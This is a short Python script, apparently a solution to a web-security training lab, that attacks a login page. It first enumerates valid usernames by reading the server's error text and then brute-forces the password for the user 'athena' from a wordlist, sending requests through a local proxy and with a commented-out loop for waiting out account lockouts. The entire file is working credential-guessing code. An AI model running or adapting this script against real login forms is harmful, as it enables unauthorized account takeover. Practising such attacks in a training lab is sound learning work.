#!/usr/bin/env python3

import requests
import time
from pwn import *

class Exploit:

    def __init__(self):

        self.url = "https://0ad700a00370b8bc85f44fd400e6001b.web-security-academy.net/login"
        self.headers = {"Content-Type":"application/x-www-form-urlencoded"}
        self.p1 = log.progress("Attempts")

    def brute_user(self):

        unfinished = True
        while unfinished == True:
            with open("users.lst", "r") as f:
                for user in f:
                    payload = f"username={user.strip()}&password=password"
                    self.p1.status(payload)
                    r = requests.post(self.url, headers=self.headers, data=payload, proxies={"https":"http://127.0.0.1:8080"}, verify=False)

                    if "Invalid username or password." not in r.text:
                        self.p1.success(payload)
                        unfinished = False
                        break

    def brute_password(self): # username is athena

        unfinished = True

        while unfinished == True:
            with open("password.lst", "r") as f:
                for password in f:
                    payload = f"username=athena&password={password.strip()}"
                    r = requests.post(self.url, headers=self.headers, data=payload, proxies={"https":"http://127.0.0.1:8080"}, verify=False)
                    self.p1.status(payload)

                    """while "You have made too many incorrect" in r.text:
                        time.sleep(60)
                        r = requests.post(self.url, headers=self.headers, data=payload, proxies={"https":"http://127.0.0.1:8080"}, verify=False)
                    """
                    if "Invalid username or password." not in r.text and "You have made too many incorrect" not in r.text:
                        self.p1.success(payload)
                        unfinished = False
                        break
def main():
    exploit = Exploit()
    exploit.brute_password()


if __name__ == "__main__":
    main()
